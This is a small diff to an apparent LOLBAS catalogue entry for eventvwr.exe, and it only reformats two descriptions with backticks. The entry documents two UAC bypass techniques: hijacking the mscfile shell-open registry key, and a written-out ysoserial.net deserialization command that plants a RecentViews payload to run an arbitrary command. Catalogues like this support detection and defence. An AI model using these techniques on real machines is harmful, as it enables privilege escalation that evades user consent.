@@ -5,7 +5,7 @@ Author: Jacob Gajek
 Created: 2018-11-01
 Commands:
   - Command: eventvwr.exe
-    Description: During startup, eventvwr.exe checks the registry value HKCU\Software\Classes\mscfile\shell\open\command for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user.
+    Description: During startup, eventvwr.exe checks the registry value `HKCU\Software\Classes\mscfile\shell\open\command` for the location of mmc.exe, which is used to open the eventvwr.msc saved console file. If the location of another binary or script is added to this registry value, it will be executed as a high-integrity process without a UAC prompt being displayed to the user.
     Usecase: Execute a binary or script as a high-integrity process without a UAC prompt.
     Category: UAC Bypass
     Privileges: User
@@ -15,7 +15,7 @@ Commands:
       - Application: GUI
       - Execute: EXE
   - Command: ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c "{CMD}" > RecentViews & copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews & eventvwr.exe
-    Description: During startup, eventvwr.exe uses .NET deserialization with %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews file. This file can be created using https://github.com/pwntester/ysoserial.net
+    Description: During startup, eventvwr.exe uses .NET deserialization with `%LOCALAPPDATA%\Microsoft\EventV~1\RecentViews` file. This file can be created using https://github.com/pwntester/ysoserial.net
     Usecase: Execute a command to bypass security restrictions that limit the use of command-line interpreters.
     Category: UAC Bypass
     Privileges: Administrator
